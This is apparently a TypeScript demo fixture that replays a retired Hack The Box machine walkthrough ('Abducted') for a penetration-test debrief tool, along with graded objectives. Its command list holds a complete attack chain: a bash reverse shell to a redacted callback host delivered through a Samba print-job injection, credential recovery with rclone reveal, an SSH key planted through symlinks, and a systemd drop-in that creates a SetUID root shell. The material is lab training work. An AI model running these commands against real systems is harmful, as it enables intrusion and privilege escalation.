/**
 * A scripted end-to-end playthrough of a REAL HTB machine ("Abducted"), used to demo the debrief
 * live — DemoDriver streams these commands into the store one at a time, recording: true, so you
 * can watch the report build (phase advancing, stealth burning, flags landing) exactly as a real
 * capture would, then resolve into the final graded debrief. No box, no capture agent, browser-only.
 *
 * Source: transcribed from the public write-up at
 *   https://0xdf.gitlab.io/2026/07/07/htb-abducted.html
 * The command path (~30 steps) is the REAL chain the write-up documents: SMB/rpcclient recon, a
 * Samba print-job command injection (CVE-2026-4480) for a foothold as `nobody`, an `rclone reveal`
 * on an offsite-backup config for scott's password, Samba wide-links + `force user = marcus` abuse
 * to plant an SSH key, and a writable systemd drop-in (operators group) to root via a SetUID shell
 * spawned from smbd's ExecStartPre. Outputs below are reconstructed from the write-up's prose and
 * terminal excerpts, not copy-pasted verbatim.
 *
 * Redaction (public_safe fixture — enforced by abducted.test.ts): the box's lab IP (10.129.x.x) is
 * replaced with the hostname `abducted.htb`; the attacker callback address is `x.x.x.x`; the
 * rclone-revealed password and the rclone-obscured secret it decodes are both `[redacted]`; both
 * flag reads are `[redacted-flag]`.
 *
 * Timings are realistic (a ~45-minute run); the driver reveals one command every ~1.5s, so it's a
 * time-compressed replay. Tactics follow the real classifier, and the golden path is authored so
 * one methodology check (an `smbmap` share-permission audit that the real run never bothered with)
 * stays skipped for a believable comparison.
 *
 * Two commands are equivalence-preserving substitutions for their write-up originals, made to dodge
 * known classifier mis-tags (same precedent as rootme.ts's payload-authoring note): `nmap` (not
 * `sudo nmap`) for the full TCP sweep, and `ssh -o IdentityFile=./id_ed25519` (not `ssh -i
 * id_ed25519`) for the marcus login — both functionally identical to the write-up's commands.
 */
import type { GoldenObjective, Session } from "../../types/report";
import { buildRaw, makeDemo, type Step } from "./build";

const START = Date.parse("2026-07-07T19:00:00Z");

const STEPS: Step[] = [
  // --- Recon: ports, NetBIOS, SMB shares, RPC null-session ---
  { cmd: "nmap -p- --min-rate 10000 abducted.htb", gap: 2_000, dur: 48_000, lines: 9, volume: 2000, out: "22/tcp ssh · 139/tcp netbios-ssn · 445/tcp microsoft-ds — full TCP sweep" },
  { cmd: "nmap -p 22,139,445 -sCV abducted.htb", gap: 15_000, dur: 22_000, lines: 18, volume: 100, out: "22/tcp OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 · 139,445/tcp Samba smbd 4.6.2 — looks like Ubuntu 24.04 LTS" },
  { cmd: "nmblookup -A abducted.htb", gap: 20_000, dur: 3_000, lines: 7, out: "ABDUCTED <00><03><20> B · WORKGROUP <00><1d><1e> — <20> set, File Server Service is up" },
  { cmd: "smbclient -L //abducted.htb/ -N", gap: 12_000, dur: 3_500, lines: 9, out: "HP-Reception (Printer) · projects (Disk) · transfer (Disk) · IPC$ — anonymous listing succeeds" },
  { cmd: 'rpcclient -N abducted.htb -U "" -c enumdomusers', gap: 10_000, dur: 2_200, lines: 1, out: "user:[scott] rid:[0x3e8] — single domain user, null session" },
  { cmd: 'rpcclient -N abducted.htb -U "" -c netshareenumall', gap: 6_000, dur: 2_600, lines: 9, out: "HP-Reception -> C:\\var\\spool\\samba · projects -> C:\\srv\\projects · transfer -> C:\\srv\\transfer" },

  // --- Exploitation: CVE-2026-4480, Samba print-job command injection ---
  { cmd: "echo 'bash -i >& /dev/tcp/x.x.x.x/443 0>&1' > '|bash'", gap: 240_000, dur: 400, lines: 1, out: "payload written — the print command forwards the job description through %J unescaped (CVE-2026-4480)" },
  { cmd: "nc -lnvp 443", gap: 8_000, dur: 600, lines: 1, out: "listening on [any] 443 ..." },
  { cmd: 'smbclient //abducted.htb/HP-Reception -N -c \'print "|bash"\'', gap: 5_000, dur: 2_800, lines: 2, out: 'putting file |bash as the print job — job description runs as a shell command · nobody@abducted:/var/spool/samba$ (caught on the listener)' },
  { cmd: "script /dev/null -c bash", gap: 6_000, dur: 1_800, lines: 1, out: "nobody@abducted:/var/spool/samba$ — upgraded to a full tty" },
  { cmd: "whoami", gap: 4_000, dur: 300, lines: 1, out: "nobody" },
  { cmd: "id", gap: 2_500, dur: 300, lines: 1, out: "uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)" },

  // --- Privesc to scott: offsite-backup rclone config, reveal, su ---
  { cmd: "cat /etc/passwd | grep 'sh$'", gap: 25_000, dur: 700, lines: 3, out: "root:x:0:0:root:/root:/bin/bash · scott:x:1000:1001:Scott Mercer:/home/scott:/bin/bash · marcus:x:1001:1002:Marcus Vale:/home/marcus:/bin/bash" },
  { cmd: "ls /opt/offsite-backup", gap: 35_000, dur: 500, lines: 2, out: "rclone.conf  sync.sh" },
  { cmd: "cat /opt/offsite-backup/rclone.conf", gap: 4_000, dur: 400, lines: 5, out: "[offsite] type = sftp · host = backup.hartley-group.internal · user = svc-backup · pass = [redacted] (rclone-obscured)" },
  { cmd: "rclone reveal [redacted]", gap: 15_000, dur: 700, lines: 1, out: "[redacted] — plaintext offsite-backup password" },
  { cmd: "su - scott", gap: 10_000, dur: 2_000, lines: 2, out: "Password: [redacted] · scott@abducted:~$ — the offsite-backup password is reused for the local account" },
  { cmd: "cat user.txt", gap: 90_000, dur: 400, lines: 1, out: "[redacted-flag]" },

  // --- Privesc to marcus: Samba wide-links + force user, SSH key injection ---
  { cmd: "cat /etc/samba/shares.conf", gap: 60_000, dur: 900, lines: 8, out: "[transfer] valid users = scott · force user = marcus · read only = no · wide links = yes · (global) allow insecure wide links = yes" },
  { cmd: "ln -s /home/marcus /srv/transfer/marcus-link", gap: 30_000, dur: 400, lines: 1, out: "symlink created — wide links + force user=marcus lets the link resolve outside the share root" },
  { cmd: "smbclient //abducted.htb/transfer -U scott%[redacted] -c 'mkdir marcus-link/.ssh; put id_ed25519.pub marcus-link/.ssh/authorized_keys'", gap: 20_000, dur: 3_200, lines: 3, out: "putting id_ed25519.pub as marcus-link\\.ssh\\authorized_keys — written to disk as marcus (force user)" },
  { cmd: "ssh -o IdentityFile=./id_ed25519 marcus@abducted.htb", gap: 25_000, dur: 2_500, lines: 1, out: "marcus@abducted:~$ — key-based login, no password needed" },
  { cmd: "id", gap: 3_000, dur: 300, lines: 1, out: "uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators) — marcus is in the operators group" },

  // --- Root: writable systemd drop-in for smbd (operators group), SetUID shell ---
  { cmd: "ls -ld /etc/systemd/system/smbd.service.d/", gap: 40_000, dur: 500, lines: 1, out: "drwxrwxr-x 2 root operators 4096 ... — group-writable by operators" },
  { cmd: 'echo -e \'[Service]\\nExecStartPre=-/bin/bash -c "cp /bin/bash /tmp/.rootbash; chmod 6777 /tmp/.rootbash"\' > /etc/systemd/system/smbd.service.d/override.conf', gap: 45_000, dur: 600, lines: 1, out: "drop-in written — ExecStartPre runs as root the next time smbd (re)starts" },
  { cmd: "systemctl daemon-reload", gap: 6_000, dur: 900, lines: 0, out: "unit files reloaded" },
  { cmd: "systemctl restart smbd", gap: 4_000, dur: 2_400, lines: 1, out: "smbd restarted — ExecStartPre ran as root; /tmp/.rootbash is now a SetUID root bash" },
  { cmd: "/tmp/.rootbash -p", gap: 8_000, dur: 500, lines: 1, out: "bash-5.2# — SetUID shell spawned" },
  { cmd: "whoami", gap: 2_000, dur: 300, lines: 1, out: "root" },
  { cmd: "cat root.txt", gap: 6_000, dur: 400, lines: 1, out: "[redacted-flag]" },
];

const DEMO_END = buildRaw(STEPS, START).at(-1)!.ended_at_ms;

export const ABDUCTED_SESSION: Session = {
  uuid: "demo-abducted-0001-0001-000000000001",
  started_at: new Date(START).toISOString(),
  ended_at: new Date(DEMO_END).toISOString(),
  target_scope: "HTB :: Abducted",
  context_path: "host",
  shell: "bash",
  source: "local_pty",
  machine: { name: "Abducted", os: "Linux", difficulty: "Medium", retired: true },
};

/**
 * The intended path from the (real) write-up. `audit_share_permissions` (an `smbmap` sweep of
 * share ACLs) is never run in this transcript, so it stays skipped and shows up in "What you'd do
 * differently" — the real run went straight from `smbclient -L` to the print-injection exploit.
 */
export const ABDUCTED_GOLDEN: GoldenObjective[] = [
  { objective: "enumerate_services", tactic: "TA0007", satisfied_by: ["nmap"] },
  { objective: "enumerate_smb_shares", tactic: "TA0007", satisfied_by: ["smbclient -L"], depends_on: ["enumerate_services"] },
  { objective: "enumerate_domain_users", tactic: "TA0007", satisfied_by: ["rpcclient"], depends_on: ["enumerate_services"] },
  { objective: "audit_share_permissions", tactic: "TA0007", satisfied_by: ["smbmap", "crackmapexec --shares"], depends_on: ["enumerate_smb_shares"] },
  { objective: "exploit_print_injection", tactic: "TA0002", satisfied_by: ["echo", "smbclient print"], depends_on: ["enumerate_smb_shares", "enumerate_domain_users"] },
  { objective: "get_foothold", tactic: "TA0002", satisfied_by: ["nc", "ncat"], depends_on: ["exploit_print_injection"] },
  { objective: "orient_as_nobody", tactic: "TA0004", satisfied_by: ["whoami"], depends_on: ["get_foothold"] },
  { objective: "enumerate_target_users", tactic: "TA0004", satisfied_by: ["cat /etc/passwd"], depends_on: ["get_foothold"] },
  { objective: "discover_offsite_backup_creds", tactic: "TA0004", satisfied_by: ["ls"], depends_on: ["enumerate_target_users"] },
  { objective: "read_rclone_config", tactic: "TA0004", satisfied_by: ["cat /opt/offsite-backup/rclone.conf"], depends_on: ["discover_offsite_backup_creds"] },
  { objective: "reuse_cred_as_scott", tactic: "TA0007", satisfied_by: ["su -"], depends_on: ["read_rclone_config"] },
  { objective: "capture_user_flag", tactic: "TA0004", satisfied_by: ["cat user.txt"], depends_on: ["reuse_cred_as_scott"] },
  { objective: "enumerate_samba_config", tactic: "TA0004", satisfied_by: ["cat /etc/samba/shares.conf"], depends_on: ["capture_user_flag"] },
  { objective: "abuse_wide_links", tactic: "TA0007", satisfied_by: ["ln -s"], depends_on: ["enumerate_samba_config"] },
  { objective: "write_ssh_key_as_marcus", tactic: "TA0007", satisfied_by: ["smbclient -U"], depends_on: ["abuse_wide_links"] },
  { objective: "ssh_as_marcus", tactic: "TA0007", satisfied_by: ["ssh"], depends_on: ["write_ssh_key_as_marcus"] },
  { objective: "find_writable_systemd_dropin", tactic: "TA0004", satisfied_by: ["ls -ld"], depends_on: ["ssh_as_marcus"] },
  { objective: "write_systemd_dropin", tactic: "TA0007", satisfied_by: ["echo"], depends_on: ["find_writable_systemd_dropin"] },
  { objective: "reload_and_restart_smbd", tactic: "TA0007", satisfied_by: ["systemctl"], depends_on: ["write_systemd_dropin"] },
  { objective: "escalate_to_root", tactic: "TA0004", satisfied_by: ["whoami"], depends_on: ["reload_and_restart_smbd"] },
  { objective: "capture_root_flag", tactic: "TA0004", satisfied_by: ["cat root.txt"], depends_on: ["escalate_to_root"] },
];

/**
 * The fully-resolved demo, built through the shared registry pipeline (build.ts): raw commands,
 * graded report, and stable id all derive from the same STEPS/session/golden above. Pre-registered
 * in the store so an "Abducted" card always shows in History; opening it replays the run live
 * (see runLiveDemo).
 */
export const ABDUCTED = makeDemo({ platform: "htb", slug: "abducted", session: ABDUCTED_SESSION, steps: STEPS, golden: ABDUCTED_GOLDEN, startMs: START });
